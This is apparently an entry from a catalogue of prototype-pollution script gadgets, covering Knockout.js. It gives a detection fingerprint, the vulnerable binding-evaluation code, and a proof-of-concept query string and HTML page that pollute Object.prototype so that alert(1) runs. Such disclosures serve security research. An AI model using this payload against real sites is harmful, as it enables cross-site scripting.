## Knockout.js

URL: https://github.com/knockout/knockout/

### JS Fingerprint
```
(typeof ko !== 'undefined' && typeof ko.version !== 'undefined')
```

### Vulnerable code fragment
https://github.com/knockout/knockout/blob/3281f7308846fa76e294c77295ce6312ae350583/src/binding/expressionRewriting.js#L46-L61
https://github.com/knockout/knockout/blob/9893233413e467a40919237e524b545e335c1050/src/binding/bindingProvider.js#L63-L68
```js
    function createBindingsStringEvaluator(bindingsString, options) {
        // Build the source for a function that evaluates "expression"
        // For each scope variable, add an extra level of "with" nesting
        // Example result: with(sc1) { with(sc0) { return (expression) } }
        var rewrittenBindings = ko.expressionRewriting.preProcessBindings(bindingsString, options),
            functionBody = "with($context){with($data||{}){return{" + rewrittenBindings + "}}}";
        return new Function("$context", "$element", functionBody);

    ...

    function parseObjectLiteral(objectLiteralString) {
        ...
        if (toks.length > 1) {
            for (var i = 0, tok; tok = toks[i]; ++i) {
```

### PoC

```
?__proto__[4]=a':1,[alert(1)]:1,'b&__proto__[5]=,
```

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/knockout/3.5.1/knockout-latest.js"></script>
<strong data-bind="text:'hello'"></strong>
<script>
  Object.prototype[4]="a':1,[alert(1)]:1,'b";
  Object.prototype[5]=',';
</script>
<script>
  ko.applyBindings({})
</script>
```